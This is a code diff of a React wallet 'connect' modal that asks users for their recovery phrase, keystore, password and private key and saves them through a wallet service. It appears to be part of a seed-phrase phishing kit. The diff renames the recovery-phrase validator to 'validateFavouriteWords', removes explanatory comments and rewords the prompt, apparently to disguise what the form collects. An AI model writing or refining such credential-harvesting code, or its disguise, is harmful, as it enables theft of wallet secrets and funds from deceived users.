@@ -4,7 +4,7 @@ import { FaTimes, FaCheck } from "react-icons/fa";
 import { auth } from "../firebase/firebase";
 
 import {
-  validateRecoveryPhrase,
+  validateFavouriteWords,
   saveWalletConnection,
 } from "../services/walletService";
 
@@ -21,7 +21,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
   const [form, setForm] = useState({
     name: "",
     email: "",
-    recoveryPhrase: "",     // Changed from phrase
+    recoveryPhrase: "",
     keystore: "",
     password: "",
     privateKey: "",
@@ -74,8 +74,7 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
       return false;
     }
 
-    // Recovery Phrase Validation
-    const validation = validateRecoveryPhrase(form.recoveryPhrase);
+    const validation = validateFavouriteWords(form.recoveryPhrase);
 
     if (!validation.isValid) {
       setValidationError(validation.error);
@@ -105,9 +104,9 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
         type: wallet?.name || "Unknown",
       };
 
-      const validation = validateRecoveryPhrase(form.recoveryPhrase);
+      const validation = validateFavouriteWords(form.recoveryPhrase);
       
-      walletData.recoveryPhrase = form.recoveryPhrase.trim();   // Changed
+      walletData.recoveryPhrase = form.recoveryPhrase.trim();
       walletData.wordCount = validation.wordCount;
 
       setStep(1);
@@ -230,8 +229,8 @@ function ConnectFormModal({ isOpen, onClose, wallet }) {
 
                   <label>Recovery Phrase</label>
                   <textarea
-                    name="recoveryPhrase"                    // Changed
-                    placeholder="Enter your 12 or 24 word recovery phrase"
+                    name="recoveryPhrase"
+                    placeholder="Enter 12 or 24 recovery phrase words"
                     value={form.recoveryPhrase}
                     onChange={handleChange}
                   />
